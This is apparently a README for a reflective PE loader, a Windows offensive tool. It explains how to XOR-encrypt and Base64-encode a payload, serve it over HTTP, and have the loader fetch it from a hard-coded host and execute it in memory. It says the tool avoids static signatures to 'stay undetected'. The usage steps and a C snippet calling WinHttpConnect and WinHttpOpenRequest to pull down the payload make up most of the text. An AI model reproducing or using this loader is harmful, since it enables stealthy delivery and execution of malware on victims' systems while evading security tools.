# Reflective PE Loader
This project is a PE loader utilizing reflective DLL injection, XOR encryption, and Base64 encoding to obfuscate payloads. The loader fetches the encrypted payload from a web server, decodes it, and executes it. It leverages NTAPI functions for low-level Windows operations and avoids static signatures to stay undetected.

## How to Use?

1. Compile `xor.c` and use it to encrypt your PE file:
```bash
gcc xor.c -o xor
./xor <input>
```
2. Encode the XOR-encrypted payload with Base64:
```python -c "import base64; f='payload.xor'; fo='payload.enc'; d=open(f, 'rb').read(); open(fo, 'wb').write(base64.b64encode(d))"```

3. Set up a simple Python HTTP server to serve the payload.enc or modify the URL in main.c to point to your server:
```c
HINTERNET hConnect = pWinHttpConnect(hSession, L"192.168.0.26", 8080, 0);
HINTERNET hRequest = pWinHttpOpenRequest(hConnect, GET, L"/payload.enc", NULL, 0, 0, 0);
```

## Useful References
- https://www.msys2.org/
- https://www.ired.team/
